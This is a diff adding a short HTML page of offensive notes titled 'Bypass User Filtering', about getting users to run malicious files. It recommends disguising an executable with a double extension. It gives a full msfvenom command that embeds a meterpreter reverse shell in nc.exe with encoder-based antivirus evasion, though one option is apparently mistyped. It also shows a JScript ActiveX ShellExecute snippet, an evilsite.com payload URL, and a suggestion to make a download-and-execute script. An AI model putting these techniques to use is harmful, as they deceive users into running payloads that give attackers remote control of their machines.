@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bypass User Filtering</title>
+</head><body><b>Change the filename</b><br/>
+Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as "shell.jpg".<br/>
+<br/>
+<b>Embed malicious code in legitimate file</b><br/>
+It is however very likely that this will be picked up by a antivirus.<br/>
+msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncMalicious.exe<br/>
+<br/>
+<b>Autodownload a malicious javascript-file</b><br/>
+Just like we can download an exe for a user to can also make that user download a javascript file. Since javascript files can execute commands on windows.<br/>
+<br/>
+var oShell = new ActiveXObject("Shell.Application");<br/>
+var commandtoRun = "C:\\Windows\\system32\\calc.exe";<br/>
+oShell.ShellExecute(commandtoRun,"","","open","1");<br/>
+<br/>
+http://evilsite.com/file.js<br/>
+<br/>
+This code can be modified to greate a wget-script and then download and execute a script.</body></html>
